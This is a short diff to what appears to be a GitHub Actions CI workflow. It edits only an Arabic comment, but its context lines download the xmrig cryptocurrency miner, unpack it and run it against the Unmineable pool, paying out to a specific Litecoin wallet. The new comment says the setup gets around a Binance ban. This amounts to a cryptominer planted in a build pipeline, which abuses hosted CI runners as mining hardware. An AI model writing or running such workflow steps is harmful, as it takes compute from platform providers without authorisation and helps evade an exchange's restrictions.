@@ -11,5 +11,5 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
           tar xvzf xmrig-6.21.0-linux-x64.tar.gz
           cd xmrig-6.21.0
-          # تعدين LTC عبر سيرفر Unmineable (بيقبل السحابي)
+          # تعدين LTC عبر سيرفر Unmineable (يتخطى حظر بينانس)
           ./xmrig -o rx.unmineable.com:443 -u LTC:ltc1q70m6d0h4tnsu9ysjk8sh2agdqyk7x4ez59eg0r.KingWorker -p x
